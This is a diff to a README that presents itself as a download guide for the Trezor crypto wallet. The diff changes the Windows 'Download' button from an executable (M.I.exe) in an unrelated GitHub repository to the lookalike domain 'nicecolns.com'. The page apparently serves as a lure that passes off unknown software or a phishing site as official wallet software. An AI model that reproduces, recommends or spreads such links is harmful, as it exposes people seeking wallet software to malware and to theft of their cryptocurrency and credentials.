@@ -9,7 +9,7 @@ A standout feature of the **trezor crypto wallet** is its compatibility with var
 
 1. Click the button below to initiate the download for the **trezor wallet** software on Windows.
    <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/e1a2e1ab-7f84-40e6-9a41-21fc2ff931e8" alt="Download" width="300"/>
     </a>
 2. Select the appropriate version compatible with your operating system.
